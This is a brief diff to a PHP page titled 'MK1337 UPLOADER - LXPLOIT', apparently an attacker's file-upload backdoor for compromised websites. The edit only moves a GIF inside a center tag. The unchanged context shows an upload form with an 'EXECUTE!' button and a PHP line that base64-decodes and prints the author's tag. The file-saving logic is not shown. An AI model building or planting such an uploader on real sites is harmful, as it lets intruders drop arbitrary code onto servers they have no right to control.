@@ -2,8 +2,10 @@
 <title>MK1337 UPLOADER - LXPLOIT</title>
 </head>
 <body>
-<img src="https://media2.giphy.com/media/ShPv5tt0EM396/giphy.gif?">
-<center><h1>MK1337 - LXPLOIT</h1>
+<center>
+<img src="https://media2.giphy.com/media/ShPv5tt0EM396/giphy.gif">
+<h1>MK1337 - LXPLOIT</h1>
+
 <form method="post" enctype="multipart/form-data"><input type="file" name="mk1337"><button>EXECUTE!</button></form>
 <?php
 echo base64_decode("TUsxMzM3");
